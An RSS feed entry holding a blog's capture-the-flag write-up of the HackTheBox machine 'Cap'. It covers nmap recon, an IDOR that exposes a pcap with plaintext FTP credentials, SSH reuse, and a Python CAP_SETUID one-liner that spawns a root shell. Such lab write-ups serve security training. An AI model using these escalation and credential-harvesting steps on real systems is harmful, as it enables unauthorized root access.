<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux-capabilities on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/linux-capabilities/</link>
    <description>Recent content in Linux-capabilities on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 14 Oct 2021 04:42:42 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux-capabilities/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Cap</title>
      <link>https://fahmifj.github.io/hackthebox/cap/</link>
      <pubDate>Thu, 14 Oct 2021 04:42:42 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cap/</guid>
      <description>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a pcap file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the CAP_SETUID capability set, which can be exploited to gain root access.
Skills Learned  Identifying/Exploiting IDOR Exploiting CAP_SETUID on Python  Tools  nmap wireshark  Reconnaissance Nmap Running nmap scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</description>
      <content:encoded><![CDATA[<p>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a <code>pcap</code> file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the <code>CAP_SETUID</code> capability set, which can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Identifying/Exploiting IDOR</li>
<li>Exploiting CAP_SETUID on Python</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>wireshark</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Running <code>nmap</code> scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.245        
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:07 EDT
Nmap scan report <span class="k">for</span> 10.10.10.245
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.070s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl <span class="m">63</span>
22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
80/tcp open  http    syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.33 seconds
→ root@kali «cap» «10.10.14.34» 
$ nmap -p21,22,80 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.245
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:08 EDT
Nmap scan report <span class="k">for</span> 10.10.10.245
Host is up <span class="o">(</span>0.062s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    gunicorn
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   FourOhFourRequest: 
<span class="p">|</span>     HTTP/1.0 <span class="m">404</span> NOT FOUND
<span class="p">|</span>     Server: gunicorn
<span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:25 GMT
<span class="p">|</span>     Connection: close
<span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="p">|</span>     Content-Length: <span class="m">232</span>
<span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
<span class="p">|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
<span class="p">|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
<span class="p">|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
<span class="p">|</span>   GetRequest: 
<span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
<span class="p">|</span>     Server: gunicorn
<span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:19 GMT
<span class="p">|</span>     Connection: close
<span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="p">|</span>     Content-Length: <span class="m">19386</span>
<span class="p">|</span>     &lt;!DOCTYPE html&gt;
<span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
<span class="p">|</span>     &lt;head&gt;
<span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
<span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
<span class="p">|</span>     &lt;title&gt;Security Dashboard&lt;/title&gt;
<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;shortcut icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/themify-icons.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/metisMenu.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/slicknav.min.css&#34;</span>&gt;

...<span class="o">[</span>SNIP<span class="o">]</span>...

<span class="p">|</span>_http-server-header: gunicorn
<span class="p">|</span>_http-title: Security Dashboard
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/9%Time<span class="o">=</span>60C08501%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
SF:quest,2FE5,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20W
</span><span class="s2">
</span><span class="s2">...[SNIP]...
</span><span class="s2">
</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 131.73 seconds
</span></code></pre></div><p>Since <code>nmap</code> didn&rsquo;t show anonymous login in FTP, I will head to the website.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>When I get to the website on port 80, I find that I&rsquo;ve already logged in as Nathan.</p>
<p><div class="img-container"><img src="imgs/image-20210609162151343.png" alt="image-20210609162151343"  /></div>
</p>
<p>There are some menu in the side navigation bar. One menu that I find interesting is the &ldquo;Security Snapshot&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210609162215061.png" alt="image-20210609162215061"  /></div>
</p>
<p>In the &ldquo;Security Snapshot&rdquo; page, there is a download button which gives me a <code>pcap</code> file. Based on the URL, it seems there are 8 pcap files that have been generated so far.</p>
<p><div class="img-container"><img src="imgs/image-20210609162434839.png" alt="image-20210609162434839"  /></div>
</p>
<p>When I open the <code>pcap</code> file, it was empty.</p>
<h4 id="idor">IDOR</h4>
<p>The download URL for pcap file is interesting here, and when I change it to 0, it pops another download prompt.</p>
<p><div class="img-container"><img src="imgs/image-20210609162545619.png" alt="image-20210609162545619"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nathan">Shell as nathan</h3>
<h4 id="pcap-analysis">Pcap Analysis</h4>
<p>There are quite a lot of traffic captured in this <code>0.pcap</code> file, but if I filter it to only show FTP, it shows that there is an FTP login performed by user <strong>nathan</strong>. Since there is no encryption, I can also see the login password.</p>
<p><div class="img-container"><img src="imgs/image-20210609162111265.png" alt="image-20210609162111265"  /></div>
</p>
<h4 id="ftp-access">FTP access</h4>
<p>Entering <code>nathan:Buck3tH4Tf0RM3</code> logs me in into the FTP server, and I can read the user flag from there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ ftp 10.10.10.245
Connected to 10.10.10.245.
<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:root<span class="o">)</span>: nathan
<span class="m">331</span> Please specify the password.
Password:
<span class="m">230</span> Login successful.
Remote system <span class="nb">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
-rw-rw-r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">8088</span> Jun <span class="m">09</span> 08:04 25134.c
-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>        <span class="m">18360</span> Jun <span class="m">09</span> 08:25 exp
-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>       <span class="m">342868</span> Jun <span class="m">09</span> 06:24 linpeas.sh
drwxr-xr-x    <span class="m">3</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> Jun <span class="m">09</span> 06:26 snap
-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Jun <span class="m">09</span> 04:59 user.txt
<span class="m">226</span> Directory send OK.
ftp&gt; 
</code></pre></div><h4 id="ssh---nathan">SSH - nathan</h4>
<p>The credentials can also be used for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ ssh nathan@10.10.10.245
nathan@10.10.10.245<span class="err">&#39;</span>s password: 
Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-73-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun  <span class="m">9</span> 09:35:15 UTC <span class="m">2021</span>

  System load:           0.0
  Usage of /:            35.0% of 8.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             <span class="m">229</span>
  Users logged in:       <span class="m">0</span>
  IPv4 address <span class="k">for</span> eth0: 10.10.10.245
  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:f2f1

  <span class="o">=</span>&gt; There are <span class="m">4</span> zombie processes.

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Wed Jun  <span class="m">9</span> 08:53:04 <span class="m">2021</span> from 10.10.16.15
nathan@cap:~$ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="web-source-code">Web source code</h4>
<p>With shell access, I went to the web directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ ls -l
total <span class="m">24</span>
drwxr-xr-x <span class="m">2</span> nathan nathan <span class="m">4096</span> May <span class="m">27</span> 09:10 __pycache__
-rw-r--r-- <span class="m">1</span> nathan nathan <span class="m">4293</span> Jun  <span class="m">9</span> 10:19 app.py
drwxr-xr-x <span class="m">6</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 static
drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 templates
drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Jun  <span class="m">9</span> 10:12 upload
nathan@cap:/var/www/html$ 
</code></pre></div><p>Looking at the source code, I see one interesting line code in a variable called <code>command</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
<span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/capture&#34;</span><span class="p">)</span>
<span class="nd">@limiter</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="s2">&#34;10 per minute&#34;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>

        <span class="n">get_lock</span><span class="p">()</span>
        <span class="n">pcapid</span> <span class="o">=</span> <span class="n">get_appid</span><span class="p">()</span>
        <span class="n">increment_appid</span><span class="p">()</span>
        <span class="n">release_lock</span><span class="p">()</span>

        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.pcap&#34;</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
        <span class="c1"># permissions issues with gunicorn and threads. hacky solution for now.</span>
        <span class="c1">#os.setuid(0)</span>
        <span class="c1">#command = f&#34;timeout 5 tcpdump -w {path} -i any host {ip}&#34;</span>
        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;python3 -c &#39;import os; os.setuid(0); os.system(&#34;timeout 5 tcpdump -w </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> -i any host </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">&#34;)&#39;&#34;&#34;&#34;</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="c1">#os.setuid(1000)</span>
<span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</code></pre></div><h4 id="linux-capabilities">Linux Capabilities</h4>
<p>When I examine the running process, the web server is currently running as <code>nathan</code>, so <code>os.setuid(0)</code> shouldn&rsquo;t be possible, except the binary has a <code>CAP SETUID</code> <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">capability set</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210609174520024.png" alt="image-20210609174520024"  /></div>
</p>
<p>A quick check on the Python binary shows that it has the <code>cap_setuid</code> set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3<span class="k">)</span>
lrwxrwxrwx <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">13</span>  <span class="m">2020</span> /usr/bin/python3 -&gt; python3.8
nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3.8<span class="k">)</span>
-rwxr-xr-x <span class="m">1</span> root root <span class="m">5486384</span> Jan <span class="m">27</span> 15:41 /usr/bin/python3.8
nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
</code></pre></div><p>So I can escalate myself to root with <code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
root@cap:/var/www/html# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
root@cap:/var/www/html# <span class="nb">cd</span> /root/
root@cap:/root# ls -l
total <span class="m">8</span>
-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun  <span class="m">9</span> 04:59 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">23</span> 19:17 snap
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
